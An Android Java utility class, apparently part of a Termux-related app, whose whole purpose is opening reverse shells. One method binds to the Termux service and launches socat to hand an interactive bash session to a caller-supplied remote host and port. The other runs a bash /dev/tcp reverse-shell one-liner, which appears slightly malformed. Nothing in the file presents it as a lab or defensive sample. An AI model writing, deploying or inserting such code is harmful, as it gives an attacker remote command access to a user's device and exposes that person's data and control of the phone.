package com.appholaworld.termuxapi;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.util.Log;

public class ReverseShellUtils {
    private String serverIP;
    private String serverPort;
    private String TAG = "ReverseShellUtils";
    
    private ServiceConnection socatServiceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            Log.d(TAG, "Connected to TermuxService");
            try {
                ITermuxService service = (ITermuxService) binder;

                String socat = "/data/data/com.termux/files/usr/bin/socat";
                String bash = "/data/data/com.termux/files/usr/bin/bash";

                String[] args = new String[] {
                    "EXEC:" + bash + " -li,pty,stderr,setsid,sigint,ctty",
                    "TCP:" + serverIP + ":" + serverPort
                };

                service.createTermuxTask(
                    socat,
                    args,
                    null,
                    "/data/data/com.termux/files/home"
                );
            } catch (ClassCastException e) {
                Log.e(TAG, "Binder does not implement ITermuxService", e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) { 
            Log.d(TAG, "Disconnected from TermuxService");
        }
    };

    public void startSocatShell(Context context, String host, String port) {
        Log.d(TAG, "Starting socat shell");
        serverIP = host;
        serverPort = port;
        
        // We use the class name string to avoid direct dependency on TermuxService class
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(context, "com.termux.app.TermuxService"));
        intent.putExtra("EXTRA_REMOTE_HOST", host);
        intent.putExtra("EXTRA_REMOTE_PORT", port);
        
        try {
            boolean bound = context.bindService(intent, socatServiceConnection, Context.BIND_AUTO_CREATE);
            Log.d(TAG, "Bind service result: " + bound);
        } catch (Exception e) {
            Log.e(TAG, "Failed to bind to TermuxService", e);
        }
    }

    public void startBashShell(Context context, String host, String port) {
        Log.d(TAG, "Starting bash shell");
        CommandUtils.executeShellCommand(context, "bash -c 0<&196;exec 196<>/dev/tcp/" + host + "/" + port + "; sh <&196 >&196 2>&196");
    }
}
